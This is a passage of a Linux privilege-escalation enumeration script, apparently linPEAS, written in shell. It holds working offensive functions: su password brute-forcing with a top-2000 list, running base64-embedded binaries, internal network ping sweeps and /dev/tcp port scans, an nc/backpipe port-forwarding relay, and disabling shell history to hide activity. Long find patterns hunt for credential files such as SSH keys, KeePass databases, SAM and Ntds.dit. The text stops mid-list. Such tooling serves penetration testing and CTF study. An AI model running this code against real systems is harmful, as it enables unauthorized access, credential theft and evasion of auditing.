  printf ${BLUE}"══╣ $GREEN$1\n"$NC # There are 2 "═"
}

print_3title_no_nl(){
  printf "\033[2K\r"
  printf ${BLUE}"══╣ $GREEN${1}..."$NC # There are 2 "═"
}

print_list(){
  printf ${BLUE}"═╣ $GREEN$1"$NC # There is 1 "═"
}

print_info(){
  printf "${BLUE}╚ ${ITALIC_BLUE}$1\n"$NC
}

print_ps (){
  (ls -d /proc/*/ 2>/dev/null | while read f; do
    CMDLINE=$(cat $f/cmdline 2>/dev/null | grep -av "seds,"); # Delete my own sed processess
    if [ "$CMDLINE" ];
      then var USER2=ls -ld $f | awk '{print $3}'; PID=$(echo $f | cut -d "/" -f3);
      printf "  %-13s  %-8s  %s\n" "$USER2" "$PID" "$CMDLINE";
    fi;
  done) 2>/dev/null | sort -r
}

su_try_pwd (){
  BFUSER=$1
  PASSWORDTRY=$2
  trysu=$(echo "$PASSWORDTRY" | timeout 1 su $BFUSER -c whoami 2>/dev/null)
  if [ "$trysu" ]; then
    echo "  You can login as $BFUSER using password: $PASSWORDTRY" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  fi
}

su_brute_user_num (){
  BFUSER=$1
  TRIES=$2
  su_try_pwd "$BFUSER" "" &    # Try without password
  su_try_pwd "$BFUSER" "$BFUSER" & # Try username as password
  su_try_pwd "$BFUSER" "$(echo $BFUSER | rev 2>/dev/null)" & # Try reverse username as password
  if [ "$PASSWORD" ]; then
    su_try_pwd "$BFUSER" "$PASSWORD" & # Try given password
  fi
  for i in $(seq "$TRIES"); do
    su_try_pwd "$BFUSER" "$(echo $top2000pwds | cut -d ' ' -f $i)" & # Try TOP TRIES of passwords (by default 2000)
    sleep 0.007 # To not overload the system
  done
  wait
}

check_if_su_brute(){
  EXISTS_SU="$(command -v su 2>/dev/null)"
  error=$(echo "" | timeout 1 su $(whoami) -c whoami 2>&1);
  if [ "$EXISTS_SU" ] && ! echo $error | grep -q "must be run from a terminal"; then
    echo "1"
  fi
}

eval_bckgrd(){
  eval "$1" &
  CONT_THREADS=$(($CONT_THREADS+1)); if [ "$(($CONT_THREADS%$THREADS))" -eq "0" ]; then wait; fi
}

macosNotSigned(){
  for filename in $1/*; do
    if codesign -vv -d \"$filename\" 2>&1 | grep -q 'not signed'; then
      echo "$filename isn't signed" | sed -${E} "s,.*,${SED_RED},"
    fi
  done
}

execBin(){
  TOOL_NAME=$1
  TOOL_LINK=$2
  B64_BIN=$3
  PARAMS=$4
  if [ "$B64_BIN" ]; then
    echo ""
    print_3title "Running $TOOL_NAME"
    print_info "$TOOL_LINK"
    echo "$B64_BIN" | base64 -d > $Wfolder/bin
    chmod +x $Wfolder/bin
    eval "$Wfolder/bin $PARAMS"
    rm -f $Wfolder/bin
    echo ""
  fi
}

###########################################
#---------) Internet functions (----------#
###########################################
check_tcp_80(){
  (timeout -s KILL 20 /bin/bash -c '( echo >/dev/tcp/1.1.1.1/80 && echo "Port 80 is accessible" || echo "Port 80 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 80 is not accessible"
}
check_tcp_443(){
  (timeout -s KILL 20 /bin/bash -c '(echo >/dev/tcp/1.1.1.1/443 && echo "Port 443 is accessible" || echo "Port 443 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 443 is not accessible"
}
check_icmp(){
  (timeout -s KILL 20 /bin/bash -c '(ping -c 1 1.1.1.1 | grep "1 received" && echo "Ping is available" || echo "Ping is not available") 2>/dev/null | grep "available"') 2>/dev/null || echo "Ping is not available"
}
# DNS function from: https://unix.stackexchange.com/questions/600194/create-dns-query-with-netcat-or-dev-udp
# I cannot use this function because timeout doesn't find it, so it's copy/pasted below
check_dns(){
  (timeout 20 /bin/bash -c '(( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS available" || echo "DNS not available") 2>/dev/null | grep "available"' ) 2>/dev/null || echo "DNS not available"
}

###########################################
#----------) Network functions (----------#
###########################################
# Adapted from https://github.com/carlospolop/bashReconScan/blob/master/brs.sh

basic_net_info(){
  print_title "Basic Network Info"
  (ifconfig || ip a) 2>/dev/null
  echo ""
}

select_nc (){
  # Select the correct configuration of the netcat found
  NC_SCAN="$FOUND_NC -v -n -z -w 1"
  $($NC_SCAN 127.0.0.1 65321 > /dev/null 2>&1)
  if [ $? -eq 2 ]
  then
    NC_SCAN="timeout 1 $FOUND_NC -v -n"
  fi
}

icmp_recon (){
  # Discover hosts inside a /24 subnetwork using ping (start pingging broadcast addresses)
	IP3=$(echo $1 | cut -d "." -f 1,2,3)

  (timeout 1 ping -b -c 1 "$IP3.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
  (timeout 1 ping -b -c 1 "255.255.255.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
	for j in $(seq 0 254)
	do
    (timeout 1 ping -b -c 1 "$IP3.$j" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${SED_RED},") &
	done
  wait
}

tcp_recon (){
  # Discover hosts inside a /24 subnetwork using tcp connection to most used ports and selected ones
  IP3=$(echo $1 | cut -d "." -f 1,2,3)
	PORTS=$2
  printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
  printf "$NC\n"

  for port in $PORTS; do
    for j in $(seq 1 254)
    do
      if [ "$FOUND_BASH" ] && [ "$TIMEOUT" ]; then
        $TIMEOUT 2.5 $FOUND_BASH -c "(echo </dev/tcp/$IP3.$j/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP3.$j:$port\"" &
      elif [ "$NC_SCAN" ]; then
        ($NC_SCAN "$IP3"."$j" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
      fi
    done
    wait
  done
}

tcp_port_scan (){
  # Scan open ports of a host. Default: nmap top 1000, but the user can select others
  basic_net_info

  print_title "Network Port Scanning"
  IP=$1
	PORTS="$2"

  if [ -z "$PORTS" ]; then
    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: DEFAULT (nmap top 1000)" $NC | tr '\n' " "
    printf "$NC\n"
    PORTS="1 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389"
  else
    PORTS="$(echo $PORTS | tr ',' ' ')"
    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
    printf "$NC\n"
  fi

  for port in $PORTS; do
    if [ "$FOUND_BASH" ]; then
      $FOUND_BASH -c "(echo </dev/tcp/$IP/$port) 2>/dev/null && echo -n \"[+] Open port at: $IP:$port\"" &
    elif [ "$NC_SCAN" ]; then
      ($NC_SCAN "$IP" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
    fi
  done
  wait
}

discover_network (){
  # Check if IP and Netmask are correct and the use fping or ping to find hosts
  basic_net_info

  print_title "Network Discovery"

  DISCOVERY=$1
  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)

  if [ -z "$IP" ] || [ -z "$NETMASK" ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi

  # Using fping if possible
  if [ "$FPING" ]; then
    $FPING -a -q -g "$DISCOVERY" | sed -${E} "s,.*,${SED_RED},"

  # Loop using ping
  else
    if [ "$NETMASK" -eq "24" ]; then
      printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n$NC"
      icmp_recon $IP

    elif [ "$NETMASK" -eq "16" ]; then
      printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n$NC"
      for i in $(seq 1 254)
      do
        NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
        icmp_recon "$NEWIP"
      done
    else
      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
      exit 0
    fi
  fi
}

discovery_port_scan (){
  basic_net_info

  # Check if IP and Netmask are correct and the use nc to find hosts. By default check ports: 22 80 443 445 3389
  print_title "Internal Network Discovery - Finding hosts and scanning ports"
  DISCOVERY=$1
  MYPORTS=$2

  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)
  echo "Scanning: $DISCOVERY"

  if [ -z "$IP" ] || [ -z "$NETMASK" ] || [ "$IP" = "$NETMASK" ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
    if [ "$IP" = "$NETMASK" ]; then
      printf $RED"[*] This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use the options: ${YELLOW}-i <IP> [-p <PORT(s)>]\n\n"$NC;
    fi
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi

  PORTS="22 80 443 445 3389 $(echo $MYPORTS | tr ',' ' ')"
  PORTS=$(echo "$PORTS" | tr " " "\n" | sort -u) # Delete repetitions

  if [ "$NETMASK" -eq "24" ]; then
    printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n" $NC
		tcp_recon "$IP" "$PORTS"

	elif [ "$NETMASK" -eq "16" ]; then
    printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n" $NC
		for i in $(seq 0 255)
		do
			NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
			tcp_recon "$NEWIP" "$PORTS"
		done
  else
      printf $RED"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
      exit 0
	fi
}


port_forward (){
  LOCAL_IP=$1
  LOCAL_PORT=$2
  REMOTE_IP=$3
  REMOTE_PORT=$4

  echo "In your machine execute:"
  echo "cd /tmp; rm backpipe; mknod backpipe p;"
  echo "nc -lvnp $LOCAL_PORT 0<backpipe | nc -lvnp 9009 1>backpipe"
  echo ""
  read -p "Press any key when you have executed those commands" useless_var

  bash -c "exec 3<>/dev/tcp/$REMOTE_IP/$REMOTE_PORT; exec 4<>/dev/tcp/$LOCAL_IP/9009; cat <&3 >&4 & cat <&4 >&3 &"
  echo "If not error was indicated, your host port $LOCAL_PORT should be forwarded to $REMOTE_IP:$REMOTE_PORT"
}


###########################################
#---) Exporting history env variables (---#
###########################################

unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0



###########################################
#-----------) Some Basic Info (-----------#
###########################################

print_title "Basic information"
printf $LG"OS: "$NC
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
printf $LG"User & Groups: "$NC
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$idB,${SED_RED},g"
printf $LG"Hostname: "$NC
hostname 2>/dev/null
printf $LG"Writable folder: "$NC;
echo $Wfolder

if ! [ "$FAST" ] && ! [ "$AUTO_NETWORK_SCAN" ]; then
  printf $LG"Remember that you can use the '-t' option to call the Internet connectivity checks and automatic network recon!\n"$NC;
fi

if [ "$DISCOVER_BAN_GOOD" ]; then
  printf $YELLOW"[+] $DISCOVER_BAN_GOOD\n$NC"
else
  printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
fi

if [ "$SCAN_BAN_GOOD" ]; then
  printf "$SCAN_BAN_GOOD\n$NC"
else
  printf $RED"[-] $SCAN_BAN_BAD\n$NC"
fi
if [ "$(command -v nmap 2>/dev/null)" ];then
  NMAP_GOOD=$GREEN"nmap${BLUE} is available for network discovery & port scanning, you should use it yourself"
  printf $YELLOW"[+] $NMAP_GOOD\n$NC"
fi
echo ""
echo ""

###########################################
#--------) Check if network jobs (--------#
###########################################
if [ "$PORTS" ]; then
  if [ "$SCAN_BAN_GOOD" ]; then
    if [ "$(echo -n $PORTS | sed 's,[0-9, ],,g')" ]; then
      printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
      printf ${BLUE}"$HELP"$NC;
      exit 0
    else
      # Select the correct configuration of the netcat found
      select_nc
    fi
  else
    printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi
fi

if [ "$DISCOVERY" ]; then
  if [ "$PORTS" ]; then
    discovery_port_scan $DISCOVERY $PORTS
  else
    if [ "$DISCOVER_BAN_GOOD" ]; then
      discover_network $DISCOVERY
    else
      printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
    fi
  fi
  exit 0

elif [ "$IP" ]; then
  select_nc
  tcp_port_scan $IP "$PORTS"
  exit 0
fi

if [ "$PORT_FORWARD" ]; then
  if ! [ "$FOUND_BASH" ]; then
    printf $RED"[-] Err: Port forwarding not possible, no bash in PATH\n"$NC;
    exit 0
  fi

  LOCAL_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 1)"
  LOCAL_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 2)"
  REMOTE_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 3)"
  REMOTE_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 4)"

  if ! [ "$LOCAL_IP" ] || ! [ "$LOCAL_PORT" ] || ! [ "$REMOTE_IP" ] || ! [ "$REMOTE_PORT" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
    exit 0
  fi

  # Check if LOCAL_PORT is a number
  if ! [ "$(echo $LOCAL_PORT | grep -E '^[0-9]+$')" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  fi

  # Check if REMOTE_PORT is a number
  if ! [ "$(echo $REMOTE_PORT | grep -E '^[0-9]+$')" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  fi

  port_forward "$LOCAL_IP" "$LOCAL_PORT" "$REMOTE_IP" "$REMOTE_PORT"
  exit 0
fi


# Get HOMESEARCH
if [ "$SEARCH_IN_FOLDER" ]; then
  HOMESEARCH="${ROOT_FOLDER}home/ ${ROOT_FOLDER}Users/ ${ROOT_FOLDER}root/ ${ROOT_FOLDER}var/www/"
else
  HOMESEARCH="/home/ /Users/ /root/ /var/www $(cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users|^/var/www" | tr "\n" " ")"
  if ! echo "$HOMESEARCH" | grep -q "$HOME" && ! echo "$HOMESEARCH" | grep -qE "^/root|^/home|^/Users|^/var/www"; then #If not listed and not in /home, /Users/, /root, or /var/www add current home folder
    HOMESEARCH="$HOME $HOMESEARCH"
  fi
fi
GREPHOMESEARCH=$(echo "$HOMESEARCH" | sed 's/ *$//g' | tr " " "|") #Remove ending spaces before putting "|"




###########################################
#----------) Caching Finds (--------------#
###########################################
if [ "$SEARCH_IN_FOLDER" ]; then
  printf $GREEN"Caching directories "$NC

  CONT_THREADS=0
  # FIND ALL KNOWN INTERESTING SOFTWARE FILES
  FIND_DIR_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"roundcube\" -o -name \"sites-enabled\" -o -name \"concourse-keys\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \"system.d\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"kubernetes\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"kube-proxy\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"kubelet\" -o -name \"pam.d\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"system-connections\" -o -name \"environments\" -o -name \".kube*\" -o -name \"bind\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"ssh*config\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"*.ftpconfig\" -o -name \"ipsec.secrets\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"*knockd*\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"my.cnf\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"sess_*\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name 